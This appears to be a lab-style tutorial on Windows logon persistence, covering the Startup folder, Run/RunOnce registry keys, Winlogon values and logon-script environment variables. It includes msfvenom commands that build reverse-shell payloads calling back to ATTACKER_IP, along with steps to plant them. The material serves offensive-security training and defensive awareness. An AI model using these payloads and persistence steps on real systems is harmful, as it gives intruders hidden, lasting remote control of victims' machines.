# Logon triggered persistence

Windows operating systems present several ways to link payloads with particular interactions.

## Startup folder

Every user has a `Startup` folder: 

    C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 

where each user can put executables to be run whenever they log in. Each user will only run whatever is available 
in their folder. An attacker can achieve persistence just by dropping a payload in there. 

If we want to force all users to run a payload while logging in, we can use the folder: 

    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

Generate a reverse shell payload using `msfvenom`:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe

Copy the payload into the target machine by spawning an `http.server` with Python and using `wget` on the target 
machine to download the file. Start listener on port 4450.

Store it in the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for 
any user logging into the machine:

    copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"

Sign out of the session from the start menu (closing an RDP window is not enough as it leaves the session open), 
and log back in via RDP to receive a connection back to the attack machine.

## Run/RunOnce

Instead of delivering a payload into a specific directory, you can also use the following registry entries to 
specify applications to run at logon:

    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. 
Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the 
`RunOnce` keys will only be executed a single time.

Create a reverse shell with msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe

After transferring it to the victim machine, move it to `C:\Windows\`:

    move revshell.exe C:\Windows

Create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name 
can be anything, and the value is the command we want to execute.        

Start a listener, sign out of the current session and log in again, and you should receive a shell.

## Winlogon

Another alternative to automatically start programs on logon is abusing `Winlogon`, the Windows component that 
loads a user's profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that can be 
used to gain persistence:

* `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
* `shell` points to the system's shell, which is usually `explorer.exe`.

Replacing any of the executables with a reverse shell break sthe logon sequence, but you can append commands 
separated by a comma, and Winlogon will process them all.

## Logon scripts

One of the things `userinit.exe` does while loading a user profile is to check for an environment variable called 
`UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get 
run when logging into the machine. The variable is not set by default, so we can just create it and assign any 
script we like.

Create a reverse shell, put it anywhere, create an environment variable for a user, go to its `HKCU\Environment` 
in the registry. Use the `UserInitMprLogonScript` entry to point to the payload for it to get loaded when the 
user logs in.

Set up a listener, sign out of the current session and log in again.



